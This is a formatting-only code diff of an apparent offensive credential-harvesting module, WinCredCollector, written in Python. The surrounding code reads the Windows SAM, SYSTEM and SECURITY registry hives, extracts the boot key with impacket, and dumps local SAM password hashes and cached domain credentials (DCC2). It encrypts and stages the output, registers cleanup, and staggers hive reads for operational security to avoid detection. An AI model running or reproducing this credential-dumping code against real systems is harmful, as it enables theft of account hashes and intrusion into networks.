@@ -17,6 +17,7 @@ OPSEC:
   - Metadata only (path, sha256, size_bytes) persisted to engagement DB.
   - Stagger enforced between hive reads.
 """
+
 from __future__ import annotations
 
 import json
@@ -36,8 +37,8 @@ _IS_WINDOWS = sys.platform == "win32"
 
 # Hive paths (standard Windows locations)
 _HIVE_PATHS = {
-    "SAM":      Path("C:/Windows/System32/config/SAM"),
-    "SYSTEM":   Path("C:/Windows/System32/config/SYSTEM"),
+    "SAM": Path("C:/Windows/System32/config/SAM"),
+    "SYSTEM": Path("C:/Windows/System32/config/SYSTEM"),
     "SECURITY": Path("C:/Windows/System32/config/SECURITY"),
 }
 
@@ -106,11 +107,12 @@ class WinCredCollector(BaseCollector):
             sys_path = _HIVE_PATHS["SYSTEM"]
 
             local_ops = LocalOperations(str(sys_path))
-            boot_key  = local_ops.getBootKey()
+            boot_key = local_ops.getBootKey()
             sam_hashes = SAMHashes(str(sam_path), boot_key, isRemote=False)
 
             # Capture output — impacket prints to stdout; redirect via callback
             import io, logging as _logging
+
             capture = io.StringIO()
             handler = _logging.StreamHandler(capture)
             root_log = _logging.getLogger("impacket")
@@ -124,8 +126,8 @@ class WinCredCollector(BaseCollector):
             if not results:
                 return None
 
-            bundle  = json.dumps({"source": "SAM", "hashes": results}).encode()
-            sha256  = self._sha256(bundle)
+            bundle = json.dumps({"source": "SAM", "hashes": results}).encode()
+            sha256 = self._sha256(bundle)
             payload = self._compress_and_encrypt(bundle)
             del bundle
             del results
@@ -135,10 +137,7 @@ class WinCredCollector(BaseCollector):
             self._register_cleanup(stage_path)
 
             record = CollectedFile(
-                path="SAM_DUMP",
-                sha256=sha256,
-                size_bytes=len(payload),
-                metadata=artifact
+                path="SAM_DUMP", sha256=sha256, size_bytes=len(payload), metadata=artifact
             )
             self.persist_metadata(record)
             self._stagger_and_pause()
@@ -163,9 +162,10 @@ class WinCredCollector(BaseCollector):
             sys_path = _HIVE_PATHS["SYSTEM"]
 
             local_ops = LocalOperations(str(sys_path))
-            boot_key  = local_ops.getBootKey()
+            boot_key = local_ops.getBootKey()
 
             import io, logging as _logging
+
             capture = io.StringIO()
             handler = _logging.StreamHandler(capture)
             root_log = _logging.getLogger("impacket")
@@ -180,8 +180,8 @@ class WinCredCollector(BaseCollector):
             if not results:
                 return None
 
-            bundle  = json.dumps({"source": "CACHED_DCC2", "hashes": results}).encode()
-            sha256  = self._sha256(bundle)
+            bundle = json.dumps({"source": "CACHED_DCC2", "hashes": results}).encode()
+            sha256 = self._sha256(bundle)
             payload = self._compress_and_encrypt(bundle)
             del bundle
             del results
@@ -191,10 +191,7 @@ class WinCredCollector(BaseCollector):
             self._register_cleanup(stage_path)
 
             record = CollectedFile(
-                path="CACHED_DCC2_DUMP",
-                sha256=sha256,
-                size_bytes=len(payload),
-                metadata=artifact
+                path="CACHED_DCC2_DUMP", sha256=sha256, size_bytes=len(payload), metadata=artifact
             )
             self.persist_metadata(record)
             self._stagger_and_pause()
